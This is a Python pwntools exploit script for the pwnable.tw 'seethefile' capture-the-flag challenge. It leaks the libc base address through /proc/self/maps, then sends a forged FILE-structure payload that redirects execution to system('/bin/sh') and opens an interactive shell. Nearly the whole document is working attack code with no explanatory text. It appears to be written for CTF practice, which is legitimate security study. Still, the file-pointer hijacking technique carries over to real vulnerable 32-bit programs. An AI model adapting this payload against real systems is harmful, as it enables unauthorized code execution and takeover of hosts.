#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys

# context.log_level = "debug"

elf = ELF("./seethefile")
# libc = ELF("./libc_32.so.6")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
p = process("./seethefile")
# p = remote("chall.pwnable.tw", 10200)

def openFile(filename):
	p.sendlineafter(" :", "1")
	p.sendlineafter(" :", filename)

def read():
	p.sendlineafter(" :", "2")

def write():
	p.sendlineafter(" :", "3")

def close():
	p.sendlineafter(" :", "4")

def exit(name):
	p.sendlineafter(" :", "5")
	p.sendlineafter(" :", name)

log.success("Step 1: leak libc.address")
openFile("/proc/self/maps")
read()
write()
read()
write()
p.recvline()
libc_addr = int(p.recvuntil("-f7", drop = True), 16) + 0x1000 # local +0x1000
systemAddr = libc.sym['system']
log.success("libc_addr:"+hex(libc_addr))
log.success("system_addr:"+hex(libc.symbols['system']))
close()

payload = '\x00'*0x20
payload += p32(0x0804B284)
payload += "/bin/sh\x00"
payload += p32(0) * 11
payload += p32(0x804b260)
payload += p32(3)
payload += p32(0) * 3
payload += p32(0x0804B260)  
payload += p32(0xffffffff) * 2
payload += p32(0x0)
payload += p32(0x0804B260)
payload += p32(0)*14
payload += p32(0x804B31C)


payload += p32(0)*2
payload += p32(0x0804B260)*15
payload += p32(libc_addr + libc.symbols['system'])
payload += p32(0x0804B260)*3

pause()
exit(payload)
pause()

p.interactive()

# p.sendline("/home/seethefile/get_flag")
# p.sendlineafter(" :", "Give me the flag\x00")
# print p.recv()

